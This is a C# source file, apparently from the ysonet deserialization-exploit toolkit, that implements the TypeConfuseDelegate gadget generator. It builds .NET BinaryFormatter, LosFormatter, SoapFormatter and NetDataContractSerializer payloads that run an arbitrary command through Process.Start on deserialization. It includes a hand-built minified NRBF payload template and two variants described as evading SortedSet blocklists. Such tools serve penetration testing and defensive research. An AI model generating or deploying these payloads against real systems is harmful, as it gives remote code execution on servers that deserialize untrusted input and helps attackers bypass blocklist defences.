using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Soap;
using System.Text;
using System.Xml;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegate: James Forshaw's delegate/type confusion.
     *
     * A Comparison<string> is combined with itself, wrapped by Comparer<string>.Create,
     * and handed to a sorted framework container. After the container is filled with two
     * benign strings, invocation-list slot 1 is replaced with Process.Start(string, string).
     * On deserialize the container rebuilds its order, calls the comparer, and the confused
     * return type turns the comparison into a process launch.
     *
     * The attacker primitive is the comparison delegate, not the container. The var/variant
     * option selects which serialized root carries it:
     *   Variant 1 (default): SortedSet<string>. Unchanged, including the hand-built NRBF
     *     minified path used with --minify --ust for BinaryFormatter and LosFormatter.
     *   Variant 2: SortedDictionary<string,string>. A public dictionary root whose private
     *     _set field is a serialized TreeSet<KeyValuePair<string,string>>; its
     *     KeyValuePairComparer forwards key comparisons to the attacker comparer.
     *   Variant 3: TreeSet<string>, the internal set type built by reflection. Its inherited
     *     SortedSet deserialization callback rebuilds the tree and calls the comparer.
     *
     * Variants 2 and 3 exist for one narrow evasion: a SerializationBinder or blocklist that
     * rejects the exact serialized type name System.Collections.Generic.SortedSet but allows
     * SortedDictionary, TreeSet, and the rest of the graph. They do NOT defeat an allowlist,
     * a rule that also rejects TreeSet, or a policy that resolves types and rejects subclasses
     * of SortedSet (TreeSet derives from SortedSet).
     *
     * All three variants are .NET Framework 4.5+ payloads: Comparer<T>.Create and the
     * ComparisonComparer<T> it returns do not exist in 4.0. The target-specific
     * TypeConfuseDelegateNetFx40 is the separate target-specific generator for the
     * different comparer shipped by .NET Framework 4.0.
     *
     * GetXamlGadget is the same technique with XamlReader.Parse in slot 1 instead of
     * Process.Start. It shares BuildConfusedContainer, so it offers the same three
     * containers; its callers expose them as their own --rootcontainer option.
     *
     * The order the two elements are serialized in is what decides which one the spliced
     * method receives first, so BuildConfusedContainer fixes it rather than reading it off
     * how the two strings sort: key1 is always written second and always arrives first.
     * See FillOrderPuttingFirstArgumentLast for the mechanism and why it costs no bytes.
     *
     * BuildConfusedContainer also takes the BENIGN Comparison<string> that fills slot 0 and
     * travels on the wire. Both paths here pass CultureSensitiveCompare (String.Compare),
     * which is what these shipped payloads have always used and what keeps them
     * byte-identical; TypeConfuseDelegateFileOperationsGenerator passes OrdinalCompare so the
     * wire agrees with its own ordinal guard.
     */
    public class TypeConfuseDelegateGenerator : GenericGenerator
    {
        public override bool SupportsLegacyFx()
        {
            return false;
        }

        // Discovery facets (category search only): runs a command directly via a
        // delegate/type confusion in a sorted framework container (mscorlib/System,
        // built-in). All three variants share these facets; only the serialized root
        // container differs, which is a wire-shape choice, not a capability change.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Combines a Comparison<string> with itself, wraps it with "
                + "Comparer<string>.Create, then swaps invocation-list slot 1 for "
                + "Process.Start(string, string). The sorted container calls the comparer "
                + "while rebuilding on deserialize, and the confused return type runs the "
                + "command. The var/variant option picks the serialized root container: "
                + "1 (default) SortedSet<string>; 2 SortedDictionary<string,string>, whose "
                + "serialized TreeSet<KeyValuePair<string,string>> backing set forwards key "
                + "comparisons through SortedDictionary.KeyValuePairComparer; 3 the internal "
                + "System.Collections.Generic.TreeSet<string>, built by reflection. Variants 2 "
                + "and 3 exist for one narrow case: a binder or blocklist that rejects the exact "
                + "wire type name System.Collections.Generic.SortedSet but allows the other "
                + "roots. They do not defeat an allowlist, a rule that also names TreeSet, or a "
                + "policy that resolves types and rejects SortedSet subclasses (TreeSet derives "
                + "from SortedSet). Variants 2 and 3 refuse an input whose executable and argument "
                + "strings compare equal, because both roots reject a duplicate key; variant 1 "
                + "accepts it but its SortedSet then holds one element and does not fire, so make "
                + "the two strings differ. SoapFormatter is a direct CLR4 document for variants "
                + "1 and 3: the target sees the native SortedSet<string> or TreeSet<string> root "
                + "and ComparisonComparer<string>, with no Workflow surrogate, outer carrier, "
                + "or nested BinaryFormatter stream. Variant 2 does not support "
                + "SoapFormatter. All three variants target .NET Framework 4.5+; use "
                + "TypeConfuseDelegateNetFx40 for exactly .NET Framework 4.0 or "
                + "TypeConfuseDelegateNetFx35 for .NET Framework 3.5 / CLR2. --legacyfx "
                + "is not supported because rewriting assembly versions cannot turn this "
                + "Comparer<T>.Create graph into a CLR2 graph.";
        }

        public override List<string> Labels()
        {
            // Independent, not GadgetTags.Hosted: this generator owns its chain and
            // hosts other gadgets' payloads (see Generators/HostedPayloads), not the
            // other way round.
            return new List<string> { GadgetTags.Independent };
        }

        private int variant_number = 1; // Default: SortedSet, the original 4.5+ payload

        // SoapFormatter's writer rejects closed generic objects before it writes their
        // serialization data. These non-generic aliases exist only while authoring the XML;
        // SerializeSoapCommandContainer replaces their element identities with the genuine
        // CLR4 closed-generic types before returning the document.
        private const string SoapSetAliasNamespace = "YsonetTcdSoapSetProxy";
        private const string SoapSetAliasType = "YsonetTcdSetRootAlias";
        private const string SoapComparerAliasNamespace = "YsonetTcdSoapComparerProxy";
        private const string SoapComparerAliasType = "YsonetTcdComparerAlias";

        public override List<GadgetVariant> Variants()
        {
            // The direct SOAP authoring path covers the one-generic-layer SortedSet and
            // TreeSet roots. SortedDictionary's backing graph adds TreeSet<KeyValuePair<...>>,
            // a KeyValuePairComparer and a typed generic item array, so variant 2 stays out
            // until that distinct document shape has its own measured effect proof.
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "SortedSet (default)"),
                new GadgetVariant(2, "SortedDictionary root (evasion)")
                    .Without(Formatters.SoapFormatter),
                new GadgetVariant(3, "TreeSet root (internal type evasion)")
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Root container: 1 -> SortedSet [default], "
                        + "2 -> SortedDictionary, 3 -> TreeSet (2 and 3 evade an exact "
                        + "SortedSet wire-name blocklist and need distinct command and "
                        + "argument strings)",
                    v =>
                    {
                        int parsed;
                        // Not the usual int.TryParse(v, out variant_number) shortcut: that
                        // silently turns "nope" or "9" into the default variant, which would
                        // hide a typo behind a payload the user did not ask for.
                        if (!int.TryParse(v, out parsed) || parsed < 1 || parsed > 3)
                            throw new OptionException(
                                "variant must be 1, 2, or 3", "variant");
                        variant_number = parsed;
                    }
                }
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()));
        }

        // BF, NDCS and Los carry all three variants. Soap carries SortedSet and TreeSet
        // through direct document paths; variant 2's SortedDictionary adds a generic
        // KeyValuePair tree and remains opted out. The
        // delegate is carried by a DelegateSerializationHolder record, which only these
        // runtime formatters and NetDataContractSerializer reproduce; the public-member
        // serializers cannot rebuild a MulticastDelegate invocation list.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                "BinaryFormatter (3)",
                "NetDataContractSerializer (3)",
                "SoapFormatter (2)",
                "LosFormatter (3)",
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Defensive: Options() already rejects anything outside 1-3, but an internal
            // caller could set the field another way.
            if (variant_number < 1 || variant_number > 3)
                throw new Exception("Unknown TypeConfuseDelegate variant: " + variant_number
                    + " (use 1, 2, or 3).");

            // Variant 2 deliberately opts out of SOAP; keep the metadata guard on the
            // ordinary and embedded generation paths as well as in the interactive editor.
            GuardVariantFormatter(variant_number, formatter);

            if (formatter.Equals(Formatters.SoapFormatter,
                StringComparison.OrdinalIgnoreCase))
                return SerializeSoapCommandContainer(variant_number, inputArgs);

            // The hand-built NRBF stream below is a hardcoded SortedSet graph, so it only
            // serves variant 1. Variants 2 and 3 take the normal Serialize() path, which
            // minifies through the same modified BinaryFormatter / LosFormatter helpers.
            if (variant_number == 1 && inputArgs.Minify && inputArgs.UseSimpleType &&
                (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
            {
                // This is to provide even a smaller payload
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                string tcd_json_minified = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
      'numMembers': 4,
      'memberNames':['Count','Comparer','Version','Items'],
      'binaryTypeEnumA':[0,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[8,null,8,null],
      'memberAssemIds':[0,0,0,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 5,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 7,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 4
}},{'Id': 8,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 3,
      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
      'numMembers': 1,
      'memberNames':['_comparison'],
      'binaryTypeEnumA':[1],
      'typeInformationA': null,
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'ArraySingleString',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 4,
      'rank': 0,
      'lengthA':[2],
      'lowerBoundA': null,
      'binaryTypeEnum': 0,
      'typeInformation': null,
      'assemId': 0,
      'binaryHeaderEnum': 17,
      'binaryArrayTypeEnum': 0
}},{'Id': 11,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 6,
      'value': '" + inputArgs.CmdArguments + @"'
}},{'Id': 12,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 7,
      'value': '" + inputArgs.CmdFileName + @"'
}},{'Id': 13,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 5,
      'name': 'System.DelegateSerializationHolder',
      'numMembers': 3,
      'memberNames':['Delegate','','x'],
      'binaryTypeEnumA':[1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 14,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 8
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 17,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 8,
      'name': 'System.DelegateSerializationHolder+DelegateEntry',
      'numMembers': 7,
      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
      'binaryTypeEnumA':[1,1,1,1,1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,null,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 18,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 11,
      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
}},{'Id': 19,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 12,
      'value': 'mscorlib'
}},{'Id': 20,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 21,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 13,
      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 22,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 14,
      'value': 'System.Diagnostics.Process'
}},{'Id': 23,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 15,
      'value': 'Start'
}},{'Id': 24,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 16
}},{'Id': 25,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 9,
      'name': 'x',
      'numMembers': 7,
      'memberNames':['','','','','','',''],
      'binaryTypeEnumA':[1,1,1,1,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,8,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 31,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 33,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 10,
      'mapId': 9
}},{'Id': 34,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 22,
      'value': 'Compare'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 36,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 24,
      'value': 'System.String'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 39,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 40,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 41,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 16,
      'mapId': 8
}},{'Id': 42,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 27,
      'value': 'System.Comparison`1[[System.String]]'
}},{'Id': 43,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 44,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 45,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 46,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 24
}},{'Id': 47,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 22
}},{'Id': 49,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    //BinaryFormatter
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_bf.ToArray();
                }
                else
                {
                    // LosFormatter
                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_lf.ToArray();
                }
            }
            else
            {
                object payload;
                if (variant_number == 2)
                    payload = TypeConfuseDelegateSortedDictionaryGadget(inputArgs);
                else if (variant_number == 3)
                    payload = TypeConfuseDelegateTreeSetGadget(inputArgs);
                else
                    payload = TypeConfuseDelegateGadget(inputArgs);

                return Serialize(payload, formatter, inputArgs);
            }
        }

        /* this can be used easily by the plugins as well */

        // A gadget or plugin that wraps TypeConfuseDelegate as its inner payload calls
        // GenerateInner (see GenericGenerator), not GenerateWithNoTest, so the OUTER
        // module's var/variant never reaches this generator: a value above 3 would fail
        // the whole generation, and 2 or 3 would silently swap the inner container.

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TypeConfuseDelegateGadget(inputArgs);
        }

        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(1, inputArgs);
        }

        // Variant 2. Same Comparison<string> -> Process.Start splice as the SortedSet
        // builder. Changed graph: the serialized root is SortedDictionary<string,string>.
        // Its serialized TreeSet<KeyValuePair<string,string>> backing field rebuilds on
        // deserialize, and KeyValuePairComparer forwards key comparisons to the attacker
        // comparer. Target: .NET Framework 4.5+.
        private static object TypeConfuseDelegateSortedDictionaryGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(2, inputArgs);
        }

        // Variant 3. Same Comparison<string> -> Process.Start splice as the SortedSet
        // builder. Changed root: the internal TreeSet<string>, created by reflection. On
        // deserialization its inherited SortedSet callback rebuilds the tree and calls the
        // attacker comparer. Target: .NET Framework 4.5+.
        private static object TypeConfuseDelegateTreeSetGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(3, inputArgs);
        }

        // The command path's two elements ARE the two Process.Start arguments, so they come
        // straight from the parsed command and can collide (see RejectEqualKeys). key1 is the
        // executable and reaches Process.Start's first parameter whatever the two strings
        // happen to sort like: BuildConfusedContainer fixes that order.
        private static object BuildCommandContainer(int container, InputArgs inputArgs)
        {
            ReadCommandFromFile(inputArgs);

            string key1 = inputArgs.CmdFileName;
            string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            return BuildConfusedContainer(container, CultureSensitiveCompare, ProcessStartSlot1(),
                key1, key2, true);
        }

        // The benign comparison the SHIPPED command and XAML payloads have always used.
        // It is String.Compare(string,string), which is culture-sensitive: keep it here so
        // those payloads stay byte-for-byte identical. A caller that needs deterministic,
        // culture-independent ordering passes String.CompareOrdinal instead (see
        // TypeConfuseDelegateFileOperationsGenerator).
        public static readonly Comparison<string> CultureSensitiveCompare =
            new Comparison<string>(String.Compare);

        // Ordinal ordering: compares UTF-16 code units, so the order a payload is built
        // with does not depend on the operator's current culture. A gadget whose two
        // strings have a REQUIRED order (the sink's first and second argument) must use
        // this, so its generation-time guard and the serialized order agree.
        public static readonly Comparison<string> OrdinalCompare =
            new Comparison<string>(String.CompareOrdinal);

        // The delegate spliced into invocation-list slot 1 by the command path.
        private static Delegate ProcessStartSlot1()
        {
            return new Func<string, string, Process>(Process.Start);
        }

        // The shared body of every TypeConfuseDelegate payload, command path and XAML path
        // alike. Builds a two-slot Comparison<string>, wraps it in Comparer<string>.Create,
        // fills the chosen sorted root with the two elements while the comparison is still
        // harmless, then swaps invocation-list slot 1 for the attacker delegate.
        //
        // container: 1 SortedSet (the original payload), 2 SortedDictionary, 3 TreeSet.
        // benignComparison: the harmless Comparison<string> that fills invocation-list slot 0
        //            and travels on the wire. It no longer decides the ORDER the two elements
        //            are serialized in (see FillOrderPuttingFirstArgumentLast), but it is
        //            still what defines an EQUAL pair here, and it is a visible part of the
        //            payload: use CultureSensitiveCompare to keep an existing payload
        //            byte-identical, or OrdinalCompare when the gadget's own guards are
        //            ordinal and the wire should agree with them.
        // slot1:     the Delegate that replaces slot 1 (Func<string,string,Process> for the
        //            command path, Func<string,object> for the XAML path, an
        //            Action<string,string> for the file-operation path).
        // key1/key2: the two elements. key1 is ALWAYS the spliced method's FIRST argument.
        //            On deserialize the container inserts the first serialized element as the
        //            root and compares the SECOND one against it, so the second serialized
        //            element is the one that arrives first. FillOrderPuttingFirstArgumentLast
        //            fixes that order here instead of leaving it to how the two strings sort.
        // keysMayCollide: true when the two elements come from user input and can compare
        //            equal, which containers 2 and 3 must refuse (see RejectEqualKeys). The
        //            XAML path passes false: its elements are the XAML string and "", and a
        //            XAML document is never empty, so they always differ. The file-operation
        //            path passes false too, because its own strict ordering guard has already
        //            rejected an equal pair with a message that names the operation.
        internal static object BuildConfusedContainer(
            int container, Comparison<string> benignComparison, Delegate slot1,
            string key1, string key2, bool keysMayCollide)
        {
            if (container < 1 || container > 3)
                throw new Exception("Unknown TypeConfuseDelegate container: " + container
                    + " (use 1, 2, or 3).");
            if (benignComparison == null)
                throw new ArgumentNullException("benignComparison");

            // Slot 0 is the benign comparison the finished payload carries. Slot 1 only orders
            // the container while it is filled HERE, and SpliceSlot1 overwrites it with the
            // attacker delegate before anything is serialized.
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(
                benignComparison, FillOrderPuttingFirstArgumentLast(benignComparison, key1));
            IComparer<string> comp = Comparer<string>.Create(d);

            if (keysMayCollide && container != 1)
                RejectEqualKeys(comp, key1, key2, container == 2 ? "SortedDictionary" : "TreeSet");

            object root;
            if (container == 2)
            {
                SortedDictionary<string, string> dictionary =
                    new SortedDictionary<string, string>(comp);
                dictionary.Add(key1, "");
                dictionary.Add(key2, "");
                root = dictionary;
            }
            else if (container == 3)
            {
                // Resolve TreeSet from the assembly that defines SortedSet, so the internal
                // type always comes from the same mscorlib we are building against.
                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
                    "System.Collections.Generic.TreeSet`1", false);
                if (openTreeSet == null)
                    throw new PlatformNotSupportedException(
                        "TreeSet is unavailable; this container requires .NET Framework 4.5+.");

                Type closedTreeSet = openTreeSet.MakeGenericType(typeof(string));
                // TreeSet is internal but its IComparer<T> constructor is public.
                root = Activator.CreateInstance(closedTreeSet, new object[] { comp });
                ICollection<string> items = (ICollection<string>)root;
                items.Add(key1);
                items.Add(key2);
            }
            else
            {
                SortedSet<string> set = new SortedSet<string>(comp);
                set.Add(key1);
                set.Add(key2);
                root = set;
            }

            SpliceSlot1(d, slot1);

            return root;
        }

        // Which of the two elements reaches the spliced method's first parameter is decided
        // by the order they are SERIALIZED in, and that order is decided by the comparison
        // used while the container is filled here. Left to the strings themselves it is luck:
        // the default -c path is safe by construction ("cmd" and "/c ...", and "/" sorts below
        // "c"), but --rawcmd removes that wrapper, and a command like "notepad.exe zzz.txt"
        // sorts the executable BELOW its argument. That used to produce
        // Process.Start("zzz.txt", "notepad.exe") - a payload that generates, deserializes and
        // does the wrong thing.
        //
        // So the order is fixed here rather than observed. A multicast Comparison returns the
        // result of the LAST method in its invocation list, which is slot 1 - the very slot
        // SpliceSlot1 overwrites with the attacker delegate afterwards. An ordering placed
        // there therefore decides the serialized order and leaves nothing on the wire: the
        // payload still carries [benign comparison, attacker delegate], and its bytes are
        // unchanged for every pair that already sorted the right way round. The hand-built
        // minified NRBF stream in Generate has always written its two strings in this fixed
        // order; this is the same rule for the object graph.
        //
        // Equality still comes from the benign comparison, so a container that collapses or
        // refuses a duplicate key (SortedSet, RejectEqualKeys) behaves exactly as before.
        private static Comparison<string> FillOrderPuttingFirstArgumentLast(
            Comparison<string> benignComparison, string firstArgument)
        {
            return delegate(string x, string y)
            {
                if (benignComparison(x, y) == 0)
                    return 0;
                // The element that must arrive as argument 1 sorts LAST, so the container
                // serializes it second and the target compares it against the root.
                return String.Equals(x, firstArgument, StringComparison.Ordinal) ? 1 : -1;
            };
        }

        // Direct SoapFormatter form for the normal CLR4 gadget. The target sees the same
        // native SortedSet<string>/TreeSet<string> -> ComparisonComparer<string> graph as
        // the other formatters. No Workflow surrogate, outer carrier, or nested formatter
        // is involved; aliases only work around the writer's closed-generic refusal.
        private object SerializeSoapCommandContainer(int container, InputArgs inputArgs)
        {
            if (container != 1 && container != 3)
                throw UnsupportedFormatter(Formatters.SoapFormatter);

            ReadCommandFromFile(inputArgs);
            string key1 = inputArgs.CmdFileName;
            string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            return SerializeSoapContainer(container, CultureSensitiveCompare,
                ProcessStartSlot1(), key1, key2, true, inputArgs);
        }

        // One direct SOAP authoring body for every form of THIS gadget. The sorted root,
        // comparer and DelegateSerializationHolder records are the TypeConfuseDelegate
        // payload; callers vary only the harmless build-time comparison, the method placed
        // in invocation-list slot 1, and the two strings it receives. Hosted gadgets may
        // reuse this through SerializeSoapXamlGadget, the explicit hosted-gadget dependency
        // allowed by Generators/README.md.
        private object SerializeSoapContainer(int container,
            Comparison<string> benignComparison, Delegate slot1,
            string key1, string key2, bool keysMayCollide, InputArgs inputArgs)
        {
            if (container != 1 && container != 3)
                throw new ArgumentException("SoapFormatter supports TypeConfuseDelegate "
                    + "rootcontainer 1 (SortedSet) and 3 (TreeSet), not 2 "
                    + "(SortedDictionary).");

            var comparer = new SoapComparisonComparerProxy(benignComparison, slot1);
            int order = comparer.Compare(key1, key2);
            if (keysMayCollide && container == 3)
                RejectEqualKeys(comparer, key1, key2, "TreeSet");

            // A real SortedSet collapses equal values while ysonet fills it. Keep that
            // established variant-1 behavior rather than letting the authored document
            // invent a second item and an effect the ordinary object graph does not have.
            //
            // Otherwise key1 is written SECOND, because the target compares the second element
            // against the first and hands it to the spliced method as argument 1. The object
            // graph fixes the same order (FillOrderPuttingFirstArgumentLast), so both forms of
            // this gadget place the executable identically.
            string[] items = order == 0
                ? new string[] { key1 }
                : new string[] { key2, key1 };

            var root = new SoapSetProxy(comparer, items);

            string payload;
            using (MemoryStream stream = new MemoryStream())
            {
                new SoapFormatter().Serialize(stream, root);
                payload = Encoding.UTF8.GetString(stream.ToArray());
            }

            XmlDocument document = new XmlDocument();
            document.PreserveWhitespace = true;
            document.LoadXml(payload);

            Type comparisonComparer = RequireSoapType(typeof(Comparer<>).Assembly,
                "System.Collections.Generic.ComparisonComparer`1").MakeGenericType(
                    typeof(string));
            Type rootType;
            if (container == 3)
            {
                rootType = RequireSoapType(typeof(SortedSet<>).Assembly,
                    "System.Collections.Generic.TreeSet`1").MakeGenericType(typeof(string));
            }
            else
            {
                rootType = typeof(SortedSet<string>);
            }

            RewriteSoapTypeAlias(document, SoapSetAliasNamespace, SoapSetAliasType,
                rootType.FullName, rootType.Assembly.FullName);
            RewriteSoapTypeAlias(document, SoapComparerAliasNamespace, SoapComparerAliasType,
                comparisonComparer.FullName, comparisonComparer.Assembly.FullName);
            payload = document.OuterXml;

            if (inputArgs.Minify)
                payload = XmlMinifier.Minify(payload, null, null,
                    FormatterType.SoapFormatter, true);

            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                inputArgs, null, true);
        }

        private static Type RequireSoapType(Assembly assembly, string fullName)
        {
            Type type = assembly.GetType(fullName, false);
            if (type == null)
                throw new SerializationException("Required SOAP target type is unavailable: "
                    + fullName + " in " + assembly.FullName);
            return type;
        }

        [Serializable]
        private sealed class SoapComparisonComparerProxy : IComparer<string>, ISerializable
        {
            private readonly Comparison<string> authoringComparison;
            private readonly SoapDelegateProxy comparison;

            internal SoapComparisonComparerProxy(Comparison<string> benignComparison,
                Delegate slot1)
            {
                if (benignComparison == null)
                    throw new ArgumentNullException("benignComparison");
                authoringComparison = benignComparison;
                comparison = new SoapDelegateProxy(benignComparison, slot1);
            }

            private SoapComparisonComparerProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP comparer proxy is never deserialized.");
            }

            public int Compare(string left, string right)
            {
                return authoringComparison(left, right);
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapComparerAliasNamespace, SoapComparerAliasType);
